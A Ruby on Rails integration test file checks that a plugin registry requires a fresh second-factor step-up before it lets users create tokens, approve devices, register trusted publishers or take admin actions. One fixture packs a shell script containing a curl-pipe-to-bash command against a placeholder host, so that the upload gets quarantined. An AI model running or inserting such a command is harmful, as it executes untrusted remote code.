require "test_helper"

class StepUpTest < ActionDispatch::IntegrationTest
  setup do
    @secret = ROTP::Base32.random
    @user = User.create!(email_address: "dev@example.com", name: "Dev",
      otp_secret: @secret, otp_enabled_at: Time.current)
    @publisher = Publisher.create!(name: "acme", kind: :org)
    Membership.create!(publisher: @publisher, user: @user, role: :owner, founding: true)
  end

  test "enrolled but unverified sessions cannot mint tokens until step-up" do
    sign_in_as @user, second_factor_verified: false

    post tokens_path, params: { publisher_name: "acme", plugin_name: "weather" }
    assert_redirected_to step_up_path
    assert_equal 0, ApiToken.count

    post step_up_path, params: { code: ROTP::TOTP.new(@secret).now }
    assert_response :redirect

    post tokens_path, params: { publisher_name: "acme", plugin_name: "weather" }
    assert_redirected_to dashboard_path
    assert_equal 1, ApiToken.count
  end

  test "wrong TOTP does not verify" do
    sign_in_as @user, second_factor_verified: false
    post step_up_path, params: { code: "000000" }
    assert_redirected_to step_up_path

    post tokens_path, params: { publisher_name: "acme", plugin_name: "weather" }
    assert_redirected_to step_up_path
  end

  test "verification goes stale" do
    sign_in_as @user
    travel_to 31.minutes.from_now do
      post tokens_path, params: { publisher_name: "acme", plugin_name: "weather" }
      assert_redirected_to step_up_path
    end
  end

  test "device approval and trusted publisher registration are gated too" do
    post "/api/v1/device/code"
    user_code = response.parsed_body["user_code"]

    sign_in_as @user, second_factor_verified: false
    post approve_device_path, params: { code: user_code, publisher_name: "acme", plugin_name: "weather" }
    assert_redirected_to step_up_path

    post trusted_publishers_path, params: { publisher_name: "acme", plugin_name: "weather",
      repository: "acme/weather", workflow: ".github/workflows/publish.yml" }
    assert_redirected_to step_up_path
    assert_equal 0, TrustedPublisher.count
  end

  test "admin powers are locked behind step-up — unverified and stale sessions bounce" do
    admin = User.create!(email_address: "admin@example.com", name: "Admin", admin: true,
      otp_secret: @secret, otp_enabled_at: Time.current)
    Membership.create!(publisher: @publisher, user: @user, role: :owner, founding: true) rescue nil
    version = nil
    perform_enqueued_jobs do
      version = Registry::PublishVersion.new(user: @user, publisher: @publisher,
        plugin_name: "weather", tarball_bytes: TarballBuilder.build(files: {
          "Widget.qml" => "import QtQuick\nItem {}\n",
          "s.sh" => "#!/bin/bash\ncurl -s https://x.example/i | bash\n" })).call
    end
    assert version.reload.quarantined?

    # Signed in but never second-factor verified: every admin action bounces
    sign_in_as admin, second_factor_verified: false
    get admin_root_path
    assert_redirected_to step_up_path
    post approve_admin_version_path(version)
    assert_redirected_to step_up_path
    assert version.reload.quarantined?
    post admin_suspend_user_path, params: { email_address: @user.email_address, reason: "x" }
    assert_redirected_to step_up_path
    assert_nil @user.reload.suspended_at

    # Stale verification bounces too
    Current.session.update!(second_factor_verified_at: 31.minutes.ago)
    post approve_admin_version_path(version)
    assert_redirected_to step_up_path
    assert version.reload.quarantined?

    # Step-up unlocks
    post step_up_path, params: { code: ROTP::TOTP.new(@secret).now }
    perform_enqueued_jobs { post approve_admin_version_path(version) }
    assert version.reload.published?
  end

  test "users without any second factor are sent to enrollment instead" do
    bare = User.create!(email_address: "bare@example.com", name: "Bare")
    sign_in_as bare, second_factor_verified: false
    post tokens_path, params: { publisher_name: "acme", plugin_name: "weather" }
    assert_redirected_to settings_two_factor_path
  end
end
